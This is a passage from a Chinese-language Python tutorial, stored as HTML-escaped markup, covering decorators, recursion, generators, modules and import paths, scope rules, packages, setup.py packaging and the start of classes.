&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;wrapper&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# 输出：&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a decorator  第7行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a function   第7行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# None                 第7行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# this is a function   第9行输出&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;递归函数&lt;&#x2F;p&gt;
&lt;p&gt;若函数内部调用自身，这个函数就是递归函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;fact&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;n==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;n*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fact&lt;&#x2F;span&gt;&lt;span&gt;(n-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fact&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;生成器&lt;&#x2F;p&gt;
&lt;p&gt;在Python中，带有yield的函数被称之为generator（生成器）&lt;&#x2F;p&gt;
&lt;p&gt;生成器是特定的函数，允许返回一个值，然后“暂停“代码的执行，稍后恢复&lt;&#x2F;p&gt;
&lt;p&gt;使用yield语句一次返回一个结果，在每个结果之间挂起和继续它们的状态&lt;&#x2F;p&gt;
&lt;p&gt;通过生成器，可以节省内存空间，使得函数的结果散落在不同时间的请求上&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#编写一个生成器函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;num&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;first&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;yield&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;second&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;yield&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;third&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;yield&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;over&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#产生生成器对象&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;a=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;num&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;next&lt;&#x2F;span&gt;&lt;span&gt;(a))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;return和yield区别&lt;&#x2F;p&gt;
&lt;p&gt;return返回结果并结束函数&lt;&#x2F;p&gt;
&lt;p&gt;yield返回结果并挂起当前状态，并与下次再执行&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;abc&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;N&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(N):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;+=i&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;yield &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Python模块&lt;&#x2F;p&gt;
&lt;p&gt;模块是一系列函数、变量、类的组成&lt;&#x2F;p&gt;
&lt;p&gt;Python程序是有一系列的模块文件组成，一个.py的文件就是一个模块&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200819220944321.png&quot; alt=&quot;image-20200819220944321&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;模块的功能&lt;&#x2F;p&gt;
&lt;p&gt;提高代码重用率：需要用到某些函数，直接调用某个模块即可，无需重复编写&lt;&#x2F;p&gt;
&lt;p&gt;提高程序层次性：不同功能函数放入不同模块，可以提高逻辑性和层次性&lt;&#x2F;p&gt;
&lt;p&gt;方便协作防止冲突：函数和变量在不同模块下可以有同样命名，但是不会冲突。这样多人协作时，即便命名冲突也不会干扰&lt;&#x2F;p&gt;
&lt;p&gt;模块原理&lt;&#x2F;p&gt;
&lt;p&gt;1.模块创建&lt;&#x2F;p&gt;
&lt;p&gt;用代码编辑器编写代码并保存为py文件&lt;&#x2F;p&gt;
&lt;p&gt;2.模块导入&lt;&#x2F;p&gt;
&lt;p&gt;import Module&lt;&#x2F;p&gt;
&lt;p&gt;导入整个模块到内存&lt;&#x2F;p&gt;
&lt;p&gt;采用点号调用函数或者变量 Module.func1&lt;&#x2F;p&gt;
&lt;p&gt;不会覆盖本地命名（变量、函数等）&lt;&#x2F;p&gt;
&lt;p&gt;from Module import Func&lt;&#x2F;p&gt;
&lt;p&gt;导入模块某个函数或变量到内存中&lt;&#x2F;p&gt;
&lt;p&gt;直接调用此函数或者变量&lt;&#x2F;p&gt;
&lt;p&gt;会覆盖本地某个相同命名（变量或者函数等）&lt;&#x2F;p&gt;
&lt;p&gt;from Module import *&lt;&#x2F;p&gt;
&lt;p&gt;导入整个模块到内存&lt;&#x2F;p&gt;
&lt;p&gt;直接调用此模块所有函数或者变量&lt;&#x2F;p&gt;
&lt;p&gt;会覆盖本地某个相同命名（变量或者函数等）&lt;&#x2F;p&gt;
&lt;p&gt;Python只会导入同一个模块一次，若再次通过import或者from命令导入同一个模块，Python不会重新加载，而是直接从内存中寻找&lt;&#x2F;p&gt;
&lt;p&gt;reload Module 重新加载模块&lt;&#x2F;p&gt;
&lt;p&gt;模块导入的流程&lt;&#x2F;p&gt;
&lt;p&gt;\1. 搜索模块路径&lt;&#x2F;p&gt;
&lt;p&gt;\2. 编译成字节码（执行更快）&lt;&#x2F;p&gt;
&lt;p&gt;\3. 将模块定义的函数、变量、类等导入运行&lt;&#x2F;p&gt;
&lt;p&gt;模块路径&lt;&#x2F;p&gt;
&lt;p&gt;搜索路径&lt;&#x2F;p&gt;
&lt;p&gt;\1. 程序运行目录（Python安装目录）&lt;&#x2F;p&gt;
&lt;p&gt;\2. 环境变量设置的（PYTHONPATH）&lt;&#x2F;p&gt;
&lt;p&gt;PYTHONPATH是设置包括Python程序文件的目录的列表，这些目录可以是用户自定义的或者平台特定的目录名&lt;&#x2F;p&gt;
&lt;p&gt;\3. 标准库模块目录&lt;&#x2F;p&gt;
&lt;p&gt;标准库模块目录存储python内置的模块文件。Python会自动搜索标准库模块的路径&lt;&#x2F;p&gt;
&lt;p&gt;\4. .pth文件&lt;&#x2F;p&gt;
&lt;p&gt;查看路径&lt;&#x2F;p&gt;
&lt;p&gt;sys.path&lt;&#x2F;p&gt;
&lt;p&gt;pytthon会将模块搜索路径统一存储在sys模块中的path变量中&lt;&#x2F;p&gt;
&lt;p&gt;sys.path包括程序运行路径、PYTHONPATH、标准库路径，这些路径都以列表来存储&lt;&#x2F;p&gt;
&lt;p&gt;配置路径&lt;&#x2F;p&gt;
&lt;p&gt;\1. 通过sys.path来添加模块搜索路径&lt;&#x2F;p&gt;
&lt;p&gt;sys.path.append(‘路径’)&lt;&#x2F;p&gt;
&lt;p&gt;\2. 通过环境变量PYTHONPATH增加模块搜索路径&lt;&#x2F;p&gt;
&lt;p&gt;set PYTHONPATH=’路径’&lt;&#x2F;p&gt;
&lt;p&gt;\3. 通过文件.pth增加模块搜索路径&lt;&#x2F;p&gt;
&lt;p&gt;在site-packages路径增加一个路径文件，如sitepath.pth，再往该文件中添加模块所在路径即可。&lt;&#x2F;p&gt;
&lt;p&gt;模块互导&lt;&#x2F;p&gt;
&lt;p&gt;模块和模块之间可以相互导入&lt;&#x2F;p&gt;
&lt;p&gt;拓展&lt;&#x2F;p&gt;
&lt;p&gt;if &lt;strong&gt;name&lt;&#x2F;strong&gt;==’&lt;strong&gt;main&lt;&#x2F;strong&gt;’:&lt;&#x2F;p&gt;
&lt;p&gt;当模块直接执行时，模块的名字为‘&lt;strong&gt;main&lt;&#x2F;strong&gt;’&lt;&#x2F;p&gt;
&lt;p&gt;当模块被导入时，模块的名字是模块本身&lt;&#x2F;p&gt;
&lt;p&gt;一般情况下，在模块里面的测试代码例如print等输出，我们可以放置在这个判断语句后面，这样其他人调用我们的模块时，就不会有额外的输出&lt;&#x2F;p&gt;
&lt;p&gt;模块进阶&lt;&#x2F;p&gt;
&lt;p&gt;\1.   命名空间和作用域&lt;&#x2F;p&gt;
&lt;p&gt;命名空间是名字和对象的映射，命名空间是一个字典，其中键是名字，值是对象。&lt;&#x2F;p&gt;
&lt;p&gt;内建函数、函数、模块、类都有自己的命名空间&lt;&#x2F;p&gt;
&lt;p&gt;命名空间分为：&lt;&#x2F;p&gt;
&lt;p&gt;python的built-in names（内置命名，包括内置函数，内置常量，内置类型）&lt;&#x2F;p&gt;
&lt;p&gt;模块的全局名称 global names（模块命名，这个模块定义的函数，类，变量）&lt;&#x2F;p&gt;
&lt;p&gt;函数的局部名称 local names（函数命名）&lt;&#x2F;p&gt;
&lt;p&gt;函数命名-本地命名空间&lt;&#x2F;p&gt;
&lt;p&gt;模块命名-全局命名空间&lt;&#x2F;p&gt;
&lt;p&gt;内置命名-外层命名空间&lt;&#x2F;p&gt;
&lt;p&gt;命名空间通过__dict__属性和dir()函数来查看，可以看到模块能使用的方法属性，以及模块中的函数和变量&lt;&#x2F;p&gt;
&lt;p&gt;\2.   作用域&lt;&#x2F;p&gt;
&lt;p&gt;表示命名空间可被访问的范围&lt;&#x2F;p&gt;
&lt;p&gt;根据Python的命名空间，作用域有下面几个：&lt;&#x2F;p&gt;
&lt;p&gt;内部函数的局部作用域&lt;&#x2F;p&gt;
&lt;p&gt;外层函数的局部作用域&lt;&#x2F;p&gt;
&lt;p&gt;模块的全局作用域&lt;&#x2F;p&gt;
&lt;p&gt;Python内置对象的外层作用域&lt;&#x2F;p&gt;
&lt;p&gt;函数定义了本地作用域，模块定义了全局作用域&lt;&#x2F;p&gt;
&lt;p&gt;\3.   LEGB查找规则&lt;&#x2F;p&gt;
&lt;p&gt;当引用一个变量时，python按照以下顺序来查找：&lt;&#x2F;p&gt;
&lt;p&gt;先从内层函数的本地作用域查找，如果没有再查找外层函数的本地作用域，如果没有再查找全局作用域，最后查找外层作用域&lt;&#x2F;p&gt;
&lt;p&gt;LEGB规则：Local-Enclosed-Global-Built-in&lt;&#x2F;p&gt;
&lt;p&gt;本地作用域例子&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image002-1597895551787.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;enclosing作用域&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image004.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;global作用域&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image006.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;built-in作用域&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image008.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;\4.   模块互导作用域的影响&lt;&#x2F;p&gt;
&lt;p&gt;验证import Module&lt;&#x2F;p&gt;
&lt;p&gt;验证 from Module import x&lt;&#x2F;p&gt;
&lt;p&gt;验证 from Module import *&lt;&#x2F;p&gt;
&lt;p&gt;包&lt;&#x2F;p&gt;
&lt;p&gt;包是一种层次化的程序组织结构，由一系列的子包和模块组成&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image010.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;包类似于模块，也可以通过import和from导入，通过点号进行访问&lt;&#x2F;p&gt;
&lt;p&gt;与模块最大的不同是，包通常是由模块和__init__文件组成&lt;&#x2F;p&gt;
&lt;p&gt;包导入语句的路径中，每一个目录内都必须有__init__.py文件，如果没有导入包会失败&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;init&lt;&#x2F;strong&gt;.py是一个初始化模块，Python首次导入某个目录时，会自动执行该目录下__init__.py文件中的所有代码&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;init&lt;&#x2F;strong&gt;.py可以是一个空文件，也可以为包执行初始化语句或设置变量等&lt;&#x2F;p&gt;
&lt;p&gt;导入语法&lt;&#x2F;p&gt;
&lt;p&gt;import d1&lt;&#x2F;p&gt;
&lt;p&gt;from d1.d3 import d3m1&lt;&#x2F;p&gt;
&lt;p&gt;包的功能：&lt;&#x2F;p&gt;
&lt;p&gt;解决模块命名冲突&lt;&#x2F;p&gt;
&lt;p&gt;简化模块搜索路径设置&lt;&#x2F;p&gt;
&lt;p&gt;实现模块与模块之间的关联&lt;&#x2F;p&gt;
&lt;p&gt;方便大型程序层次化组织&lt;&#x2F;p&gt;
&lt;p&gt;方便第三方组件拓展（第三方组件可以通过包来进行分发）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image012.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;如果包目录中，所有模块的名字是唯一的，导入的时候可以使用from…import语法来导入&lt;&#x2F;p&gt;
&lt;p&gt;如果模块名字有重叠，就通过import来导入，调用的时候采用点号方法，保证唯一性&lt;&#x2F;p&gt;
&lt;p&gt;包管理工具&lt;&#x2F;p&gt;
&lt;p&gt;包管理涉及打包、分发、下载、编译、安装等环节，不同环境由不同的包管理工具来执行&lt;&#x2F;p&gt;
&lt;p&gt;常见的包管理工具&lt;&#x2F;p&gt;
&lt;p&gt;distutils 可以实现包分发、安装等功能，是Python内置的包管理工具 通过setup.py执行&lt;&#x2F;p&gt;
&lt;p&gt;setuptools distutils的增加版，实现包分发、安装、下载、管理功能 通过ez_setup.py来安装setuptools&lt;&#x2F;p&gt;
&lt;p&gt;easy_install &lt;&#x2F;p&gt;
&lt;p&gt;pip&lt;&#x2F;p&gt;
&lt;p&gt;distribute 是setuptools的增强版&lt;&#x2F;p&gt;
&lt;p&gt;打包例子&lt;&#x2F;p&gt;
&lt;p&gt;打包的准备工作：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image014.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;下面是setup.py的设置&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;clip_image016.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;执行打包的命令，在setup.py文件的路径下，调用python&lt;&#x2F;p&gt;
&lt;p&gt;python3 setup.py +发布格式&lt;&#x2F;p&gt;
&lt;p&gt;发布格式有两种：sdist bdist&lt;&#x2F;p&gt;
&lt;p&gt;sdist:创建源码发行包 默认的发布格式为gztar tar zip等（tar.gz）&lt;&#x2F;p&gt;
&lt;p&gt;bdist:创建二进制发行包 发布格式有rpm msi wininst (exe)&lt;&#x2F;p&gt;
&lt;p&gt;打包好之后可以把它发布到互联网，其他人下载之后可以这样来安装：&lt;&#x2F;p&gt;
&lt;p&gt;tar -zxvf d1-1.0.tar.gz 解压&lt;&#x2F;p&gt;
&lt;p&gt;cd d1-1.0 进入解压后的目录下&lt;&#x2F;p&gt;
&lt;p&gt;python3 setup.py install 执行包安装&lt;&#x2F;p&gt;
&lt;p&gt;如果要在windows安装，打包的时候发布格式可以选择bdist（python3 setup.py bdist_wininst）会生成exe安装文件，安装的时候直接双击安装即可。&lt;&#x2F;p&gt;
&lt;p&gt;Python面向对象-类&lt;&#x2F;p&gt;
&lt;p&gt;类的定义&lt;&#x2F;p&gt;
&lt;p&gt;类（class）是设计蓝图，用来创建不同类型的对象。Python内置有数字、字符串、列表、字典等对象，这些内置对象已经有规定好的属性和方法。如果需要创建新的对象类型。则需要使用类。&lt;&#x2F;p&gt;
&lt;p&gt;类是一种数据结构，可以用来定义对象，将数据值和行为特征结合在一起&lt;&#x2F;p&gt;
&lt;p&gt;类指定了对象将包含哪些数据和函数，数据一般是变量，函数一般我们称之为方法&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200820181424465.png&quot; alt=&quot;image-20200820181424465&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;人（类）—小明（实例）—10岁，吃饭&lt;&#x2F;p&gt;
&lt;p&gt;​			   —小红（实例）—9岁，睡觉&lt;&#x2F;p&gt;
&lt;p&gt;类的功能：&lt;&#x2F;p&gt;
&lt;p&gt;对事物进行高度的抽象，提高代码的重用率（类可以创建子类和超类），提高程序的层次性（类支持继承）&lt;&#x2F;p&gt;
&lt;p&gt;类的语法：&lt;&#x2F;p&gt;
&lt;p&gt;class ClassName:&lt;&#x2F;p&gt;
&lt;p&gt;​	‘类的说明’&lt;&#x2F;p&gt;
&lt;p&gt;​	类的主体（定义类的数据属性和方法）&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    name=&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#变量属于类的数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    age=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printname&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#函数属于类的方法属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;构造函数，用于给实例&#x2F;对象初始化参数，构造函数中第一个参数必须是self，代表实例或对象本身&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
